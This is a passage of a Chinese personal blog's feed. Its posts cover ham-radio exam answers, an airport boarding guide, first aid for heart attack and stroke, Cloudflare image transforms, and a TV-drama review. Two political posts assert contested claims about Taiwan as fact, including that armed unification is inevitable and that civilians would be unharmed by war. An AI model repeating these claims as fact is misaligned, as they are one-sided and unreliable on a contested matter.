m（WARC）</td><td><strong>主要（业余为主要之一，共用）</strong>。(<a href="https://zh.wikipedia.org/zh-hans/%E4%B8%9A%E4%BD%99%E6%97%A0%E7%BA%BF%E7%94%B5%E9%A2%91%E7%8E%87%E5%88%92%E5%88%86?utm_source=chatgpt.com">维基百科</a>)</td><td>—</td><td>WARC 波段，业余通常为主&#x2F;共用（考试常列入“主要”记忆清单）。</td></tr><tr><td>21.0–21.45</td><td>15 m</td><td><strong>专用（业余专用 &#x2F; 业余为唯一主要）</strong>。(<a href="https://ezirmusitua.site/blog/ham-radio-level-b-questions?utm_source=chatgpt.com">三水言己</a>)</td><td>—</td><td>15m 在我国常标为业余专用。</td></tr><tr><td>24.89–24.99</td><td>12 m（WARC）</td><td><strong>主要（业余为主要之一）</strong>。(<a href="https://zh.wikipedia.org/zh-hans/%E4%B8%9A%E4%BD%99%E6%97%A0%E7%BA%BF%E7%94%B5%E9%A2%91%E7%8E%87%E5%88%92%E5%88%86?utm_source=chatgpt.com">维基百科</a>)</td><td>—</td><td>WARC 波段，通常为业余主要&#x2F;共用。</td></tr><tr><td>28.0–29.7</td><td>10 m</td><td><strong>专用（业余专用 &#x2F; 唯一主要）</strong>。(<a href="https://ezirmusitua.site/blog/ham-radio-level-b-questions?utm_source=chatgpt.com">三水言己</a>)</td><td>—</td><td>10m 在我国被列为业余专用（考试点）。</td></tr><tr><td><strong>（补：常考 VHF&#x2F;UHF 参照）</strong></td><td></td><td></td><td></td><td></td></tr><tr><td>50–54</td><td><code>6 m</code></td><td><strong>主要（业余为主要之一，与其它业务共用）</strong>。(<a href="https://nxww.nx.gov.cn/bsfw/ywgl/bgxz/201808/P020220319742052081161.pdf?utm_source=chatgpt.com">宁夏无线电管理委员会</a>)</td><td>—</td><td>常作为 VHF 的主要业余段（考试记忆点）。</td></tr><tr><td>144–146</td><td><code>2 m（下段）</code></td><td><strong>唯一主要 &#x2F; 专用（业余为唯一主要业务）</strong>（我国教材&#x2F;题库常强调 144–146 为业余的“唯一主要”段）。(<a href="https://nxww.nx.gov.cn/bsfw/ywgl/bgxz/201808/P020220319742052081161.pdf?utm_source=chatgpt.com">宁夏无线电管理委员会</a>)</td><td>—</td><td>144–146 常被强调为“业余的唯一主要段”（146–148 则与其它业务共用为主要）。</td></tr><tr><td>146–148</td><td><code>2 m（上段）</code></td><td><strong>主要（与其他业务共同作为主要业务）</strong>。(<a href="https://nxww.nx.gov.cn/bsfw/ywgl/bgxz/201808/P020220319742052081161.pdf?utm_source=chatgpt.com">宁夏无线电管理委员会</a>)</td><td>—</td><td>144–148 在我国整体列为 144–146 唯一主要，146–148 与其它共同主要。</td></tr><tr><td>430–440</td><td><code>70 cm</code></td><td><strong>次要（业余为次要）</strong>。(<a href="https://nxww.nx.gov.cn/bsfw/ywgl/bgxz/201808/P020220319742052081161.pdf?utm_source=chatgpt.com">宁夏无线电管理委员会</a>)</td><td><strong>主要：无线电定位（radiodetermination）与航空无线电导航（aeronautical radionavigation）</strong>（我国划分表对 430–440 此类业务为主要，业余须让行）。(<a href="https://cmiitid.cn/frequency?lower=430&upper=440&utm_source=chatgpt.com">CMIIT ID 查询</a>)</td><td>地方上会因局部存在定位&#x2F;航空导航系统而限制业余使用（各地无线电管理机关会具体指配&#x2F;限制）。</td></tr></tbody></table></div><h2 id="错题本"><a href="#错题本" class="headerlink" title="错题本"></a>错题本</h2><ol><li>在频率划分表中，当一个频段划分给业余业务或卫星业余业务和多个其他业务，并且业余业务和卫星业余业务作为<code>次要业务</code>时，业余电台应遵循的规则是：<ul><li>不得对主要业务电台产生有害干扰</li><li>不得对来自主要业务电台的有害干扰提出保护要求</li><li>可要求保护不受来自同一业务或其他次要业务电台的有害<br>干扰</li></ul></li><li>俗称的 <code>6米</code>业余波段的频率范围以及业余业务和卫星业余业务的使用状态分别为：<br>[A]50～54MHz，主要业务 </li><li>俗称的 <code>2米</code>业余波段的频率范围以及我国业余业务和卫星业余业务的使用状态分别为：<br>[A]144～146MHz为唯一主要业务，146～148MHz为主要业务</li><li>俗称的 <code>0.7米</code>业余波段的频率范围以及业余业务和卫星业余业务的使用状态分别为：<br>[A]430～440MHz，次要业务</li><li>在我国和多数其他国家的频率分配中，业余业务在 430～440MHz频段中作为次要业务与其他业务共用。这个频段中我国分配的<code>主要业务</code>是：<br>[A]无线电定位和航空无线电导航</li><li>我国分配给业余业务和卫星业余业务<code>专用</code>的频段有：<br>[A]7MHz、14MHz、21MHz、28MHz、47GHz</li><li>我国分配给业余业务和卫星业余业务与其他业务共用、并且业余业务和卫星业余业务作为<code>次要业务</code>的 1200MHz以下频段有：<br>[A]135.7kHz、10.1MHz、430MHz</li><li>VHF业余电台在<code>144MHz</code>频段进行本地联络时应<code>避免占用</code>的频率为：<br>[A]144～144.035MHz和 145.8～146MHz</li><li>UHF业余电台在<code>430MHz</code>频段进行本地联络时应<code>避免占用</code>的频率为：<br>[A]431.9～432.240MHz和 435～438MHz</li><li>我国所属的“CQ分区”有：<br>  [A]23、24、27 </li><li>“ITU分区”是 IARU的活动计算通信成绩的基础。我国所属的“ITU分区”有：<br>[A]42、43、44、50 </li><li><code>峰-峰值为 100伏</code>的正弦交流电压，其<code>有效值电压</code>为：<br>[A]约 35.4伏 【100&#x2F;2&#x2F;2的平方根】</li><li><code>峰-峰值为 100伏</code>的正弦交流电压，其<code>平均值电压</code>为：<br>[A]0 </li><li><code>峰值为 100伏</code>的正弦交流电压，其<code>有效值电压</code>为：<br>[A]约 70.7伏</li><li>一个频率为 F的简单正弦波信号的频谱包含有：<br>[A]频率为 F的一个频率分量</li><li>只包含一个频率分量的信号是：<br>[A]简单正弦波 </li><li>在整个频谱内具有连续的均匀频率分量的信号是：<br>[A]单个无限窄脉冲</li><li>假设中继台的收、发信机共用天线，上下行频率分别为 F1和 F2。要防止中继台发射机对接收机产生干扰，应该对中继台设备采取下列措施：<br>[A]在发信机与天线间串联中心频率为 F1的带阻滤波器，在收信机与天线间串接中心频率为 F2的&#96;带阻滤波器 </li><li>要防止业余 HF发射机的杂散发射干扰天线附近的电话机，应该在电话机和电话线之间串联：<br>[A]截止频率不高于 <code>1MHz</code>的<code>低通滤波器 </code></li><li>通信或家用设备的劣质开关电源会造成对无线电接收机的电磁干扰，其源头主要是：<br>[A]开关电路的谐波辐射 </li><li>杂散发射（spurious emission）是指：必要带宽之外的一个或多个频率的发射，其发射电平可降低而不致影响相应信息的传输。一台发射机，工作频率为 145.000MHz，但在 435.000MHz的频率上也有发射。这种发射属于：<br>[A]杂散发射</li><li>接收机灵敏度指标数值大小所反映的意义是：<br>[A]灵敏度指标数值越小，接收最小信号的能力越强 </li><li>在零仰角附近具有主辐射瓣的垂直接地天线，其振子的长度应为：<br>[A]1&#x2F;4波长的奇数倍</li><li>通常把垂直偶极天线或者垂直接地天线称为“全向天线”，是因为：<br>[A]它们在水平方向没有指向性，但在<code>立体空间有方向性</code></li><li>振子电气长度为 1&#x2F;4波长的垂直接地天线的最大辐射方向为：<br>[A]在水平方向没有指向性，在<code>垂直方向指向水平面</code></li><li>我国国家标准《电磁辐射防护规定》所规定的电磁辐射防护限值的公众照射基本限值，其<code>基本计量方法</code>是：<br>[A]一天 24小时内任意 6分钟内全身平均的比吸收率（SAR）应小于每千克体重限值</li><li>我国国家标准《电磁辐射防护规定》规定电磁辐射公众照射导出限值中，对环境电磁辐射场强一天 24小时内任意 6分钟内的平均值要求最严格的频率范围为：<br>[A]30MHz～3GHz</li><li>无线电波在自由空间中的传播路径损耗遵循下列规律：<br>[A]与距离的平方成正比，与频率的平方成正比</li><li>多径传播对 UHF波段或 VHF波段数据通信的影响是：<br>[A]误码率可能增加 </li><li>对于<code>400MHz以上</code>的信号，通常会使用的同轴电缆连接器是：<br>[A]N型连接器</li><li>《业余无线电台执照》有效期届满后需要继续使用的，应当在下列期限内向核发执照的无线电管理机构申请办理延续手续：<br>[A]有效期届满一个月前</li><li><code>超出核定范围使用频率</code>或者有其他违反频率管理有关规定的行为的，无线电管理机构可以根据其具体情况，给予设置业余无线电台的单位或个人下列处罚：<br>[A]责令限期改正，可以处警告或者三万元以下的罚款</li><li>无线电发射机<code>调制部件</code>的作用是：<br>[A]以<code>原始信号</code>控制射频信号的幅度、频率、相位参数</li><li>对于给定的 FM发射设备，决定其<code>射频输出</code>信号<code>实际占用带宽</code>的因素是：<br>[A]所传输信号的最高频率越高、幅度越大，射频输出占用带宽越宽 </li><li>下列哪种调制被 VHF和 UHF业余电台<code>本地通信广泛使用</code>？<br>[A]FM </li><li>以下哪种语音调制常被用于<code>长距离弱信号</code>的 VHF或 UHF联络？<br>[A]SSB</li><li>以<code>dBi</code>为单位的天线增益则是指：<br>[A]最大辐射方向辐射功率密度与<code>理想点源天线</code>最大辐射方向辐射功率密度之比的 dB值。</li><li>以<code>dBd</code>为单位的天线增益则是指：<br>[A]最大辐射方向辐射功率密度与<code>半波长振子</code>最大辐射方向辐射功率密度之比的 dB值 。</li><li>我国现行法律体系中专门针对<code>无线电管理</code>的最高法律文件及其立法机关是：<br>[A]《中华人民共和国无线电管理条例》，国务院和中央军委</li><li>我国现行法律体系中专门针对<code>业余无线电台管理</code> 的最高法律文件及其立法机关是：<br>[A]《业余无线电台管理办法》，工业和信息化部</li><li>用通常的调频方式进行话音通信，必要带宽约为：<br>[A]6.25kHz </li><li>]业余无线电通信最常用的三种基本调制方法，其缩写 <code>AM、FM和 PM</code>，它们的中文名称分别是：<br>[A]幅度调制（调幅）、频率调制（调频）、相位调制（调相）</li></ol>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>登机</title>
      <link href="/posts/deng-ji/"/>
      <url>/posts/deng-ji/</url>
      
        <content type="html"><![CDATA[<h2 id="值机与打印登机牌"><a href="#值机与打印登机牌" class="headerlink" title="值机与打印登机牌"></a>值机与打印登机牌</h2><p>值机就是办理登机手续，包括确认身份、安排座位、领取登机牌。登机牌是你通过安检、登机的凭证，上面有航班号、座位号、登机口等信息 。机票则是你购买运输服务的凭证，主要用于报销 。</p><p>因为你只有背包，不需要托运，所以：</p><p>如果你已线上值机并获取了电子登机牌，理论上可直接前往安检。但鉴于你是第一次乘机，建议在自助值机设备上打印一张纸质登机牌，更方便后续流程和问询。</p><p>如果未线上值机，到达机场后，前往对应航空公司的自助值机设备（分布在出发大厅），刷身份证即可选座、打印登机牌 。</p><h2 id="使用支付宝权益"><a href="#使用支付宝权益" class="headerlink" title="使用支付宝权益"></a>使用支付宝权益</h2><h3 id="快捷安检与可能的休息室："><a href="#快捷安检与可能的休息室：" class="headerlink" title="快捷安检与可能的休息室："></a>快捷安检与可能的休息室：</h3><p>打印登机牌后，请前往位于出发大厅25号门附近的“贵宾俱乐部”接待处 。</p><p>向工作人员出示你的支付宝钻石会员快速安检权益使用码进行验证。</p><p>工作人员可能会根据你的登机时间，询问是否需要在前台后面的安检前休息室稍作休息。该休息室通常提供免费饮料、零食和泡面 。此项权益是否符合免费条件，请务必在现场与贵宾俱乐部工作人员确认。</p><p>验证后，工作人员会告知你具体的快速安检通道号码（通常是2号通道或头等舱通道 ）。</p><h3 id="通过快速安检："><a href="#通过快速安检：" class="headerlink" title="通过快速安检："></a>通过快速安检：</h3><p>根据指引前往指定的快速安检通道。这条通道人少，基本不用排队 。</p><p>正常接受安全检查。</p><h3 id="免费电瓶车服务："><a href="#免费电瓶车服务：" class="headerlink" title="免费电瓶车服务："></a>免费电瓶车服务：</h3><p>通过安检后，下到4.2米层的国内出发到达混流区，这里设有电瓶车服务点 。</p><p>向电瓶车工作人员出示支付宝的出行优惠二维码（可在支付宝内搜索“出行优惠”或类似条目查看），有可能免费乘坐电瓶车前往你的登机口 。</p><p>告知司机你的登机口号码，电瓶车会送你过去。这对于登机口较远时非常方便。</p><h2 id="⚠️-重要注意事项"><a href="#⚠️-重要注意事项" class="headerlink" title="⚠️ 重要注意事项"></a>⚠️ 重要注意事项</h2><p>预留时间：虽然快速通道能节省时间，但仍建议提前至少2小时到达机场，以从容应对所有流程。</p><p>权益确认：</p><p>支付宝权益（如休息室、电瓶车）的具体规则和可用性可能变动。出行前最好在支付宝APP内再确认一下权益详情和使用条款。</p><p>关于安检前休息室，支付宝钻石会员的权益可能仅限于快速安检，休息室使用权建议现场咨询贵宾俱乐部工作人员确认。</p><p>行李要求：你只有一个背包，这很好。请确保包内没有刀具、超过100毫升的液体等违禁品 。背包尺寸和重量一般要求较宽松，但最好确认是否符合你所乘航空公司的规定（通常重量不超过5-10公斤） 。</p><h2 id="💎-总结一下"><a href="#💎-总结一下" class="headerlink" title="💎 总结一下"></a>💎 总结一下</h2><p>记住主要流程和地点：到机场自助打印登机牌 → 去25号门附近的“贵宾俱乐部”出示支付宝权益 → 走指定的快速安检通道 → 安检后到4.2米层找电瓶车，出示支付宝二维码尝试免费乘坐 → 到达登机口登机。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>冠心病与急救策略</title>
      <link href="/posts/guan-xin-bing-yu-ji-jiu-ce-lue/"/>
      <url>/posts/guan-xin-bing-yu-ji-jiu-ce-lue/</url>
      
        <content type="html"><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>冠心病（冠状动脉粥样硬化性心脏病）是一种常见且严重的疾病，它不仅影响心脏功能，还与心肌梗死（心梗）和脑梗死（脑梗）等危及生命的急症密切相关。了解冠心病的基本知识，以及在紧急情况下非医护人员应如何进行院前急救，对于保护自己和身边人的生命健康至关重要。本文将详细介绍冠心病、心梗和脑梗的关系，常见的急救情形，并提供实用的院前急救策略。</p><p><img src="https://imgbed.eamon.dpdns.org/file/1754592147016_%E5%BF%83%E8%82%BA%E5%A4%8D%E8%8B%8F%E6%9C%AF.webp" alt="心肺复苏术"></p><h2 id="冠心病（冠状动脉疾病）"><a href="#冠心病（冠状动脉疾病）" class="headerlink" title="冠心病（冠状动脉疾病）"></a>冠心病（冠状动脉疾病）</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>冠心病，全称冠状动脉粥样硬化性心脏病，是由于心脏的血管（冠状动脉）发生粥样硬化，导致血管腔狭窄或闭塞，引起心肌缺血、缺氧或坏死的一类心脏病。它是最常见的心脏病之一。</p><h3 id="病因"><a href="#病因" class="headerlink" title="病因"></a>病因</h3><p>冠心病的主要病因是动脉粥样硬化，即脂肪、胆固醇和其他物质在动脉壁上堆积形成斑块，使动脉变窄、变硬，从而影响血液流动。风险因素包括：</p><ul><li><strong>不可改变的风险因素：</strong> 年龄（随年龄增长风险增加）、性别（男性风险高于女性，女性绝经后风险增加）、家族史（有冠心病家族史者风险高）。</li><li><strong>可改变的风险因素：</strong> 高血压、高血脂（高胆固醇）、糖尿病、吸烟、肥胖、缺乏体力活动、精神压力大、不健康的饮食习惯等。</li></ul><h3 id="症状"><a href="#症状" class="headerlink" title="症状"></a>症状</h3><p>冠心病患者的症状因病情严重程度和个体差异而异，常见症状包括：</p><ul><li><strong>胸痛（心绞痛）：</strong> 这是最常见的症状，通常表现为胸骨后或心前区压榨性、闷胀性疼痛，可放射至左肩、左臂、颈部、下颌或背部。常在劳累、情绪激动、饱餐或寒冷时发生，休息或含服硝酸甘油后可缓解。</li><li><strong>气短&#x2F;呼吸困难：</strong> 尤其在活动后或夜间平卧时出现。</li><li><strong>疲劳：</strong> 持续性的疲劳感。</li><li><strong>心悸：</strong> 感觉心跳不规则或心跳加速。</li><li><strong>出汗、恶心、头晕：</strong> 这些症状可能伴随胸痛出现，尤其在心肌梗死时更为明显。</li><li><strong>无症状：</strong> 部分患者可能在早期没有明显症状，直到发生心肌梗死等严重事件才被发现。</li></ul><h2 id="冠心病与心梗、脑梗的关系"><a href="#冠心病与心梗、脑梗的关系" class="headerlink" title="冠心病与心梗、脑梗的关系"></a>冠心病与心梗、脑梗的关系</h2><p>冠心病、心肌梗死（心梗）和脑梗死（脑梗）都属于心脑血管疾病范畴，它们之间存在密切的联系，主要体现在共同的病理基础和危险因素上。</p><h3 id="共同的病理基础：动脉粥样硬化"><a href="#共同的病理基础：动脉粥样硬化" class="headerlink" title="共同的病理基础：动脉粥样硬化"></a>共同的病理基础：动脉粥样硬化</h3><p>心梗和脑梗最常见的病因都是动脉粥样硬化。动脉粥样硬化不仅发生在冠状动脉，也可能发生在全身其他动脉，包括脑部血管。当动脉粥样硬化斑块破裂，形成血栓，导致血管完全或部分堵塞时，就会引发相应器官的缺血坏死。</p><ul><li><strong>冠心病与心梗：</strong> 冠心病是心肌梗死的主要原因。心肌梗死是冠心病最严重的并发症之一，通常是由于冠状动脉粥样硬化斑块破裂，形成血栓，完全堵塞冠状动脉，导致心肌长时间缺血坏死。因此，可以说心梗是冠心病发展到严重阶段的一种急性表现。</li><li><strong>冠心病与脑梗：</strong> 冠心病和脑梗都与全身性的动脉粥样硬化有关。患有冠心病的人，其脑部血管也可能存在动脉粥样硬化，从而增加脑梗的风险。此外，心脏疾病（如心律失常，特别是房颤）可能导致心脏内形成血栓，这些血栓脱落后随血液循环到达脑部，堵塞脑血管，引发脑梗。因此，冠心病患者发生脑梗的风险显著高于普通人群。</li></ul><h2 id="冠心病容易出现的急救情形"><a href="#冠心病容易出现的急救情形" class="headerlink" title="冠心病容易出现的急救情形"></a>冠心病容易出现的急救情形</h2><p>冠心病患者可能突然出现危及生命的情况，需要立即急救。以下是常见的急救情形：</p><h3 id="1-急性心肌梗死"><a href="#1-急性心肌梗死" class="headerlink" title="1. 急性心肌梗死"></a>1. 急性心肌梗死</h3><p>这是冠心病最严重、最常见的急救情况。当冠状动脉完全闭塞，导致心肌长时间缺血坏死时发生。症状通常比心绞痛更严重、持续时间更长，且休息或含服硝酸甘油不能完全缓解。</p><ul><li><strong>典型症状：</strong> 剧烈、持续的胸骨后或心前区压榨性疼痛，可放射至左肩、左臂、颈部、下颌、背部。常伴有大汗淋漓、恶心、呕吐、呼吸困难、濒死感。</li><li><strong>非典型症状：</strong> 部分患者（尤其是老年人、糖尿病患者和女性）可能表现为上腹部不适、牙痛、咽喉痛、背痛、疲劳、气短等，容易被忽视或误诊。</li></ul><h3 id="2-恶性心律失常"><a href="#2-恶性心律失常" class="headerlink" title="2. 恶性心律失常"></a>2. 恶性心律失常</h3><p>冠心病可能导致各种心律失常，其中室颤（心室颤动）和室速（室性心动过速）是危及生命的恶性心律失常，可导致心脏骤停。</p><ul><li><strong>症状：</strong> 突然意识丧失、抽搐、呼吸停止、脉搏消失。</li></ul><h3 id="3-心力衰竭急性加重"><a href="#3-心力衰竭急性加重" class="headerlink" title="3. 心力衰竭急性加重"></a>3. 心力衰竭急性加重</h3><p>冠心病长期发展可能导致心力衰竭，当心力衰竭急性加重时，患者会出现严重的呼吸困难。</p><ul><li><strong>症状：</strong> 呼吸急促、端坐呼吸（平卧时呼吸困难加重，需要坐起来才能缓解）、咳嗽、咳粉红色泡沫痰。</li></ul><h3 id="4-心源性猝死"><a href="#4-心源性猝死" class="headerlink" title="4. 心源性猝死"></a>4. 心源性猝死</h3><p>指心脏原因导致的突然死亡，通常在症状出现后1小时内发生。冠心病是心源性猝死最常见的原因，多数与恶性心律失常有关。</p><ul><li><strong>症状：</strong> 突然倒地、意识丧失、呼吸停止、脉搏消失。</li></ul><h2 id="非医护人员的院前急救策略"><a href="#非医护人员的院前急救策略" class="headerlink" title="非医护人员的院前急救策略"></a>非医护人员的院前急救策略</h2><h3 id="1-急性心肌梗死（心梗）的院前急救"><a href="#1-急性心肌梗死（心梗）的院前急救" class="headerlink" title="1. 急性心肌梗死（心梗）的院前急救"></a>1. 急性心肌梗死（心梗）的院前急救</h3><p>当怀疑有人突发心肌梗死时，非医护人员应立即采取以下措施：</p><ul><li><strong>立即拨打急救电话：</strong> 立即拨打120（或其他当地急救电话），清晰告知患者的地点、主要症状和初步判断。这是最关键的第一步，争取黄金救治时间。</li><li><strong>让患者停止一切活动并休息：</strong> 立即让患者停止正在进行的任何活动，帮助其平卧或采取最舒适的体位（如半卧位，抬高头部和肩部），保持安静，减少心脏负荷。禁止患者奔走呼救或自行前往医院。</li><li><strong>安抚患者情绪：</strong> 保持镇静，安抚患者的紧张和焦虑情绪，因为情绪激动会增加心脏负担。</li><li><strong>解开衣领，保持呼吸道通畅：</strong> 松开患者的衣领、腰带，帮助其呼吸顺畅。</li><li><strong>询问是否有急救药物：</strong> 如果患者随身携带有硝酸甘油等急救药物，且意识清醒，可协助其含服。但请注意，非医务人员不推荐给患者服用阿司匹林，因为阿司匹林可能有不良反应，且需要专业判断。</li><li><strong>密切观察患者情况：</strong> 观察患者的意识、呼吸和脉搏情况。如果患者意识丧失，呼吸、心跳停止，应立即进行心肺复苏（CPR）。</li><li><strong>心肺复苏（CPR）：</strong> 如果患者意识丧失，没有呼吸或仅有濒死喘息，没有脉搏，应立即开始高质量的心肺复苏。对于非专业人士，可以专注于胸外按压，按压频率为每分钟100-120次，深度为5-6厘米，尽量减少中断。</li><li><strong>等待专业救援：</strong> 在等待急救人员到来期间，持续观察患者情况，并继续进行必要的急救措施。</li></ul><h3 id="2-脑梗死（卒中）的院前急救"><a href="#2-脑梗死（卒中）的院前急救" class="headerlink" title="2. 脑梗死（卒中）的院前急救"></a>2. 脑梗死（卒中）的院前急救</h3><p>脑梗死（俗称脑中风）的急救关键在于“时间就是大脑”。非医护人员应记住“FAST”原则，并迅速采取行动：</p><ul><li><p><strong>“FAST”原则快速识别：</strong></p><ul><li><strong>F (Face drooping - 面部下垂)：</strong> 让患者微笑，观察面部一侧是否下垂或麻木。</li><li><strong>A (Arm weakness - 手臂无力)：</strong> 让患者举起双臂，观察其中一只手臂是否无力或下垂。</li><li><strong>S (Speech difficulty - 言语困难)：</strong> 让患者说一句简单的话，观察是否口齿不清或言语含糊。</li><li><strong>T (Time to call emergency - 呼叫急救时间)：</strong> 如果出现以上任何症状，立即拨打120。</li></ul></li><li><p><strong>立即拨打急救电话：</strong> 立即拨打120，告知患者的地点、发病时间、主要症状（特别是“FAST”识别出的症状）。发病时间对于脑梗的溶栓治疗至关重要。</p></li><li><p><strong>保持患者平卧，头偏向一侧：</strong> 帮助患者平卧，解开衣领，保持呼吸道通畅。如果患者有呕吐，应将头部偏向一侧，以防呕吐物误吸入气管。</p></li><li><p><strong>不要随意搬动患者：</strong> 避免剧烈摇晃或搬动患者，以免加重病情。</p></li><li><p><strong>不要给患者喂食或喂水：</strong> 脑梗患者可能存在吞咽困难，喂食或喂水可能导致呛咳或误吸。</p></li><li><p><strong>密切观察患者情况：</strong> 观察患者的意识、呼吸、心跳等生命体征，等待专业急救人员的到来。</p></li><li><p><strong>记录发病时间：</strong> 尽量准确记录患者出现症状的具体时间，这将对医生判断治疗方案非常重要。</p></li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>冠心病是一种需要长期管理的心脏疾病，其最严重的并发症是心肌梗死和脑梗死。这些急症的发生往往突然且危及生命，因此，公众掌握基本的院前急救知识和技能至关重要。在面对心梗或脑梗的紧急情况时，非医护人员应保持冷静，立即拨打急救电话，并根据患者的具体情况采取相应的急救措施，如让患者休息、安抚情绪、保持呼吸道通畅，并在必要时进行心肺复苏。记住，及时、正确的院前急救能够为患者争取宝贵的救治时间，显著提高生存率和改善预后。然而，院前急救只是为专业医疗争取时间，最终的治疗仍需依靠专业的医疗团队。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 急救 </tag>
            
            <tag> 冠心病 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>台湾困境</title>
      <link href="/posts/tai-wan-kun-jing/"/>
      <url>/posts/tai-wan-kun-jing/</url>
      
        <content type="html"><![CDATA[<p>媒体造谣不负责。<br>这是台湾政治生态和社会风气的问题，不全是媒体的锅。。中天若能做到早就做到了，即便馆长在台湾媒体界有一席之地，也作用有限，买这种<code>执照</code>是白花钱！！！！</p><p>冤枉 柯文哲 ，台湾恶劣的政治内斗是罪魁祸首。都忙着铲除异己了，以<code>政党斗争</code>为纲，哪有精力搞建设？即便他当选，也只能有限地缓和两岸关系，仍不会有实质改善，如改台独课纲。黄国昌利用<code>造谣的 太阳花</code>上位，实际上跟台独民进党一个路子！为哪门子台湾未来？挟私夺权才是首要任务！</p><p>常年抹黑大陆，矢志不渝地推<code>反共</code>教育。台湾主流虽倾向两岸<code>维持现状</code>，心里却坚信<code>两国论</code>。两岸是内战未尽同时存在的两个<code>政权</code>，而不是两个独立国家。<code>九二共识</code>是台湾提的方案，其中的<code>一中</code>指的并非PRC也不是ROC，而是<code>领土包含两岸的 中国</code>。现在的国民党连自己的<code>九二共识</code>都不敢认，有这种认识的台湾人应该只有占少数的<code>统派</code>吧？</p><p>台湾政治已经被<code>反共民粹</code>绑架了，谁能利用<code>反共民粹</code>谁才有政权。蔡正元说得对，台湾各党派都怕被扣<code>中共同路人</code>，台湾根本没有<code>和统</code>的内在推动条件。<code>武统</code>不可避免，只是台湾普通人别去参军做台独的<code>肉盾</code>，若实在接受不了中共能移民走尽早移民。即便打起来，也只是铲除台独政客，台湾平民不会受丝毫影响，除非是<code>台独 死忠粉</code>。</p><p>让两岸 战火重燃的，是赖清德这种台独分子。若他不想打，大陆<code>基于和统愿望</code>也没理由主动打。<br>而统一的促进者只可能是<code>中共</code>，不过兵临城下时，就别期望<code>一国两制</code>了，当初给台湾机会主动提方案奈何台湾政坛不中用啊。。。让时间来检验我的看法吧。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 政治 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CF图像转换</title>
      <link href="/posts/cf-tu-xiang-zhuan-huan/"/>
      <url>/posts/cf-tu-xiang-zhuan-huan/</url>
      
        <content type="html"><![CDATA[<h2 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h2><p>使用图片转换接口，只需改变<code>查询参数</code>，就能在不更改<code>源站原图</code>的情况下，获取到不同尺寸的<code>缩略图</code>。</p><h2 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h2><h3 id="1-CF管理的域名"><a href="#1-CF管理的域名" class="headerlink" title="1. CF管理的域名"></a>1. CF管理的域名</h3><p>   根域相同，或两个均受CF管理的不同域名，以下两者都要开启<code>橙色云</code>代理。</p><ul><li>CF worker作为转换原图像请求的中介，必须绑定<code>CF托管的</code>自定义域名，该接口才有效；</li><li>图片所在站点，也必须绑定<code>CF托管的</code>自定义域名。</li></ul><h3 id="2-开启图片转换"><a href="#2-开启图片转换" class="headerlink" title="2. 开启图片转换"></a>2. 开启图片转换</h3><ul><li><p><code>Images &gt; 转换</code></p></li><li><p>选择启用图片转换功能的CF worker区域</p></li></ul><p>  <img src="/posts/cf-tu-xiang-zhuan-huan/CF-worker%E5%8C%BA%E5%9F%9F.webp" alt="CF-worker区域"></p><ul><li>选择图片所在的一个或多个CF区域</li></ul><p>  <img src="/posts/cf-tu-xiang-zhuan-huan/CF%E7%AB%99%E7%82%B9%E4%B8%AD%E7%9A%84%E5%9B%BE%E7%89%87%E6%89%80%E5%9C%A8%E5%8C%BA%E5%9F%9F.webp" alt="CF站点中的图片所在区域"></p><h2 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h2><p>据说，CF worker图片转换转发接口，直接访问 未CF管理且开启<code>橙色云</code>代理的域名是通过<code>公网</code>访问图片，可能会遭遇图片源站的限制。而直接访问CF管理域名走得是CF内网，能正常响应。<br>若图片原链接中的域名不受<code>CF域名管理</code>，有如下报错，</p><blockquote><p>ERROR 9519: Could not fetch the image — the server returned HTTP error 522 <unknown status code></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>零日攻击</title>
      <link href="/posts/ling-ri-gong-ji/"/>
      <url>/posts/ling-ri-gong-ji/</url>
      
        <content type="html"><![CDATA[<p><del>台湾的零日攻击，太不现实了！</del></p><p><del>何时上映？我想好好嘲笑一番……</del></p><p>满满的<code>意识形态</code>洗脑，接受“一国两制”就是<code>投降派</code>？打又打不过，这是最有诚意的条件了好吧？！</p><p>趁早主动谈判还有的让步，真等到被逼到家门口时签城下之盟，真没资格说“从实力的地位出发，同大陆进行谈话”，真是认不清现实。</p><p>港独分子<code>杜汶泽</code>声援台独，垃圾人拍垃圾片，水平真差。</p><p>电影两小时能讲完的<code>科幻</code>故事，竟然能水近10集？！一群市井小民支线“灌水”严重，主旨不明确。</p><p>政论节目女主持<code>尹乃菁</code>，竟然会客串这种垃圾片，台湾演艺圈是真够小。</p><p>白花钱的<code>烂片</code>，鉴定完毕！</p><p><img src="https://imgbed.eamon.dpdns.org/file/1751278055487_%E7%81%AB%E7%AE%AD%E5%8D%87%E7%A9%BA.webp" alt="火箭升空.webp"></p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 电影 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>正视历史</title>
      <link href="/posts/zheng-shi-li-shi/"/>
      <url>/posts/zheng-shi-li-shi/</url>
      
